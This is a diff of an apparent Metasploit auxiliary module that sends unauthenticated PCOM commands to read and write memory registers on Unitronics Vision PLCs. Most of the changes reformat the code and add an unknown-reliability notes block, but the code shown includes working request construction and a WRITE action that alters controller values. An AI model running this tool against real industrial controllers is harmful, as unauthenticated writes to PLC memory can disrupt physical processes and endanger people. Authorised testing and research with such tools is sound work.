@@ -7,25 +7,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Unitronics PCOM Client',
-      'Description'   => %q{
-        Unitronics Vision PLCs allow unauthenticated PCOM commands
-        to query PLC registers.
-      },
-      'Author'         => [ 'Luis Rosa <lmrosa[at]dei.uc.pt>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Unitronics PCOM Client',
+        'Description' => %q{
+          Unitronics Vision PLCs allow unauthenticated PCOM commands
+          to query PLC registers.
+        },
+        'Author' => [ 'Luis Rosa <lmrosa[at]dei.uc.pt>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]
         ],
-      'Actions'        =>
-        [
+        'Actions' => [
           ['READ', { 'Description' => 'Read values from PLC memory' } ],
           ['WRITE', { 'Description' => 'Write values to PLC memory' } ]
         ],
-      'DefaultAction' => 'READ'
-    ))
+        'DefaultAction' => 'READ',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -34,30 +40,31 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('ADDRESS', [true, "PCOM memory address (0 - 65535)", 0]),
         OptInt.new('LENGTH', [true, "Number of values to read (1 - 255) (read only)", 3]),
         OptString.new('VALUES', [false, "Values to write (0 - 65535 each) (comma separated) (write only)"]),
-        OptEnum.new("OPERAND", [true, 'Operand type', "MI", ["Input", "Output", "SB", "MB", "MI", "SI", "ML", "SL", "SDW","MDW"]])
-      ])
+        OptEnum.new("OPERAND", [true, 'Operand type', "MI", ["Input", "Output", "SB", "MB", "MI", "SI", "ML", "SL", "SDW", "MDW"]])
+      ]
+    )
   end
 
   # compute and return the checksum of a PCOM ASCII message
   def pcom_ascii_checksum(msg)
-    (msg.each_byte.inject(:+) % 256 ).to_s(16).upcase.rjust(2, '0')
+    (msg.each_byte.inject(:+) % 256).to_s(16).upcase.rjust(2, '0')
   end
 
   # compute and return the pcom length
   def pcom_ascii_len(pcom_ascii)
-    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))
+    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4, '0').unpack('H4H4').reverse.pack('H4H4'))
   end
 
   # return a pcom ascii formatted request
   def pcom_ascii_request(command)
-    unit_id = datastore['UNITID'].to_s(16).rjust(2,'0')
+    unit_id = datastore['UNITID'].to_s(16).rjust(2, '0')
     # PCOM/ASCII
     pcom_ascii_payload = "" +
-      "\x2f" + # '/'
-      unit_id +
-      command +
-      pcom_ascii_checksum(unit_id + command) + # checksum
-      "\x0d" # '\r'
+                         "\x2f" + # '/'
+                         unit_id +
+                         command +
+                         pcom_ascii_checksum(unit_id + command) + # checksum
+                         "\x0d" # '\r'
 
     # PCOM/TCP header
     Rex::Text.rand_text_hex(2) + # transaction id
@@ -99,8 +106,8 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')
-    length = datastore['LENGTH'].to_s(16).rjust(2,'0')
+    address = datastore['ADDRESS'].to_s(16).rjust(4, '0')
+    length = datastore['LENGTH'].to_s(16).rjust(2, '0')
     print_status("Reading #{length} values (#{datastore['OPERAND']}) starting from #{address} address")
     sock.put(pcom_ascii_request(cc + address + length))
     sock.get_once
@@ -129,8 +136,9 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Unknown answer #{cc}")
       return
     end
-    data.scan(/.{#{size}}/).each_with_index {|val, i|
-      print_good("[#{(start_addr + i).to_s.rjust(5,'0')}] : #{val.to_i(16)}")}
+    data.scan(/.{#{size}}/).each_with_index { |val, i|
+      print_good("[#{(start_addr + i).to_s.rjust(5, '0')}] : #{val.to_i(16)}")
+    }
   end
 
   def write
@@ -162,9 +170,9 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')
-    length = values.length.to_s(16).rjust(2,'0')
-    values_to_write = values.map{|s| s.to_i(10).to_s(16).rjust(4,'0')}.join
+    address = datastore['ADDRESS'].to_s(16).rjust(4, '0')
+    length = values.length.to_s(16).rjust(2, '0')
+    values_to_write = values.map { |s| s.to_i(10).to_s(16).rjust(4, '0') }.join
     print_status("Writing #{length} #{datastore['OPERAND']} (#{datastore['VALUES']}) starting from #{address} address")
     sock.put(pcom_ascii_request(cc + address + length + values_to_write))
     sock.get_once
@@ -183,7 +191,7 @@ class MetasploitModule < Msf::Auxiliary
           print_error("No answer from PLC")
           return
         end
-        print_read_ans(ans.to_s[10..(ans.length-4)])
+        print_read_ans(ans.to_s[10..(ans.length - 4)])
       end
     when "WRITE"
       if datastore['VALUES'] == nil
